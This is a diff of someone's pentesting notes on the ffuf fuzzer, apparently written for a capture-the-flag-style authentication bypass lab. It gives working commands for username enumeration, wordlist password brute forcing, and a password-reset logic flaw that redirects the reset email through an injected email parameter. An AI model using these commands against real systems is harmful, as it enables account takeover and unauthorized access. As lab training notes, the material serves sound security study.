@@ -1,18 +1,30 @@
-ffuf commands
+=== ffuf commands ===
 
 available from github: https://github.com/ffuf/ffuf
 
 <pentesting fundamentals - Authentication Bypass> [big deal]
 
-What is ffuf?
+--- What is ffuf? ---
 ffuf fuzz faster u fool. Fuzzing is a technique for locating implementation bugs by using malformed/semi-malformed data injection in an automated fashion.
 
-Username enum
+--- Username enum ---
+Spam a bunch of usernames from wordlists and gather results
+
 ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.7.180/customers/signup -mr "username already exists"
 
 create a valid_usenames.txt from results located above, use for next command:
 
-Brute force
+--- Brute force ---
+Spam a bunch of usernames from previously gathered results and passwords from wordlist
+
 ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.7.180/customers/login -fc 200
 
-Logic flaw
+--- Logic flaw ---
+Manually make request on form to reset password
+
+Just a test below.
+curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
+
+This is the full command to get the reset password email sent to your recently created user account.
+
+curl 'http://10.10.142.106/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
